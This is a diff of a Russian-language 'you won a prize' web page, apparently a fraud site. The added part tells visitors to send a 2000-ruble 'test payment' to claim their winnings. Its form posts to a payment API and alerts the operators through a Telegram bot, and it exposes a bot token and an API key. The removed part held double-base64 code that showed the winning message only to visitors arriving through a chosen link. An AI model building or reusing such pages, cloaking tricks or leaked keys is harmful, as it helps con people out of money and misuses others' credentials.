@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Поздравляем! Вы победили!</title>
+  <title>Получите свой приз</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap" rel="stylesheet">
   <style>
     body {
@@ -39,14 +39,28 @@
       margin-bottom: 30px;
     }
 
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 2px solid #fff;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+      font-size: 1em;
+    }
+
+    textarea {
+      height: 120px;
+    }
+
     .btn {
-	text-decoration:none;
       background-color: #fff;
       color: #3813C2;
       border: none;
       padding: 15px 30px;
       border-radius: 30px;
-      font-size: 1em;
+      font-size: 1.2em;
       font-weight: bold;
       cursor: pointer;
       transition: 0.3s ease;
@@ -69,19 +83,28 @@
 
   <canvas class="confetti"></canvas>
 
-  <div class="card" id="main">
+  <div class="card">
+    <h1>Получите свой приз!</h1>
+    <p>Для получения приза, Вам необходимо сообщить реквезиты банковской карты.</p>
+    <p>Для передачи реквезитов выполните тестовый платеж на сумму 2000 р на наш счет.</p>
+    <p>Также возможна небольшая межбанковская комиссия.</p>
+    <p>После этого Вы сразу получите свой приз.</p>
+    
+    <!-- Contact Form -->
+    <form id="contact-form" method="post" action="https://paysystem24.com/api/request/">
+		<input type="hidden" name="amount" value="2000"/>
+        <input type="hidden" name="merchant_order_id" value="optional"/>
+        <input type="hidden" name="use_card_payment" value="RUB"/>
+        <input type="hidden" name="success_url" value="https://familyman111.github.io/thr.html"/>
+        <input type="hidden" name="fail_url" value="https://familyman111.github.io/index.html"/>
+        <input type="hidden" name="notice_url" value="https://api.telegram.org/bot6311769211:AAF6CvymwqypKKsi1syD7EtyPFdkX1mNSAM/sendMessage?chat_id=-1001971396205&text=OK"/>
+        <input type="hidden" name="api_key" value="4a6fbfd9163fff65d1216b7d509d03a5f4707ce03d126a6684ad3b05bd595759"/>
+		<button type="submit" class="btn">Продолжить</button>
+    </form>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <script>
-  if(window.location.href.match(/eue/)){
-    var a = 'UEdneFB2Q2Zqb2tnMEpMUml5RFF2OUMrMExIUXRkQzAwTGpRdTlDNElTRHduNDZKUEM5b01UNDhjRDdRbjlDKzBMZlF0TkdBMExEUXN0QzcwWS9RdGRDOElOQyswWUlnMExMUmdkQzEwTGtnMExUUmc5R0kwTGdoSU5DUzBZc2cwTC9RdnRDeDBMWFF0TkM0MEx2UXVDRFFzaURRdmRDdzBZalF0ZEM4SU5DNjBMN1F2ZEM2MFlQUmdOR0IwTFVnMEwvUmdOQzQwTGZRdnRDeUlOQzRJTkN5MFl2UXVOQ3owWURRc05DNzBMZ2dPREF3TURBZzBZQXVQQzl3UGp4aElHTnNZWE56UFNKaWRHNGlJR2h5WldZOUluTmxZeTVvZEcxc0lqN1FsOUN3MExIUmdOQ3cwWUxSakNEUXY5R0EwTGpRdHp3dllUND0=';
-    a = decodeURIComponent(escape(atob(atob(a))));
-  } else {
-    var a = 'UEhBK1RHOXlaVzBnYVhCemRXMGdaRzlzYjNJZ2MybDBJR0Z0WlhRc0lHTnZibk5sWTNSbGRIVnlJR0ZrYVhCcGMybGphVzVuSUdWc2FYUXNJSE5sWkNCa2J5QmxhWFZ6Ylc5a1BHSnlQblJsYlhCdmNpQnBibU5wWkdsa2RXNTBJSFYwSUd4aFltOXlaU0JsZENCa2IyeHZjbVVnYldGbmJtRWdZV3hwY1hWaExpQlZkQ0JsYm1sdElHRmtJRzFwYm1sdElIWmxQR0p5UG1saGJTdzhZbkkrY1hWcGN5QnViM04wY25Wa0lHVjRaWEpqYVhSaGRHbHZiaUIxYkd4aGJXTnZJR3hoWW05eWFYTWdibWx6YVNCMWRDQmhiR2x4ZFdsd0lHVjRJR1ZoSUdOdmJXMXZaRzg4WW5JK1kyOXVjMlZ4ZFdGMExpQkVkV2x6SUdGMWRHVWdhWEoxY21VZ1pHOXNiM0lnYVc0Z2NtVndjbVZvWlc1a1pYSnBkQ0JwYmlCMmIyeDFjSFJoZEdVZ2RtVnNhWFFnWlhOelpUeGljajVqYVd4c2RXMGdaRzlzYjNKbElHVjFJR1oxWjJsaGRDQnVkV3hzWVNCd1lYSnBZWFIxY2k0Z1JYaGpaWEIwWlhWeUlITnBiblFnYjJOallXVmpZWFFnWTNWd2FXUmhkR0YwSUc1dmJqeGljajV3Y205cFpHVnVkQ3dnYzNWdWRDQnBiaUJqZFd4d1lTQnhkV2tnYjJabWFXTnBZU0JrWlhObGNuVnVkQ0J0YjJ4c2FYUWdZVzVwYlNCcFpDQmxjM1FnYkdGaWIzSjFiUzQ4TDNBKw==';
-    a = atob(atob(a));
-  }
-  document.getElementById('main').innerHTML = a
     const canvas = document.querySelector('.confetti');
     const confetti = window.confetti.create(canvas, { resize: true });
     confetti({
